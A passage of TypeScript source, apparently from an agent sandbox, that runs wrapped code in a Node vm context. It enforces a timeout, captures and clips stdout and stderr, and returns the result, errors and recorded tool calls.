  let timer: ReturnType<typeof setTimeout> | undefined;
  let timedOut = false;
  let returnValue: unknown;
  let executionError: string | undefined;
  let ok = false;

  try {
    const timeoutMs = policy.timeoutMs;
    const timeoutPromise = new Promise<never>((_, reject) => {
      timer = setTimeout(() => {
        timedOut = true;
        abortController.abort();
        reject(new Error('Sandbox timeout exceeded'));
      }, timeoutMs);
    });

    const script = new vm.Script(wrapped, { filename: `crowclaw-sandbox-${options.sessionId}.js` });

    const runPromise = script.runInContext(context, {
      // vm's own timeout: kills synchronous infinite loops.
      timeout: timeoutMs,
      breakOnSigint: true,
    }) as Promise<unknown>;

    returnValue = await Promise.race([runPromise, timeoutPromise]);
    ok = true;
  } catch (err: unknown) {
    if (timedOut) {
      executionError = 'Sandbox timeout exceeded';
      stderrBuf.push(`${executionError}\n`);
    } else {
      executionError = err instanceof Error ? err.message : String(err);
      stderrBuf.push(`${executionError}\n`);
    }
    ok = false;
  } finally {
    if (timer) clearTimeout(timer);
  }

  const stdout = clipBuffer(stdoutBuf, policy.maxOutputBytes);
  const stderr = clipBuffer(stderrBuf, policy.maxOutputBytes);
  const durationMs = Date.now() - startedAt;
  const toolCalls = [...bridge.callRecords];

  options.eventBus?.emit('code:complete', {
    sessionId: options.sessionId,
    ok,
    durationMs,
    toolCallCount: toolCalls.length,
  });

  return {
    ok,
    returnValue,
    stdout,
    stderr,
    toolCalls,
    durationMs,
    error: executionError,
  };
}
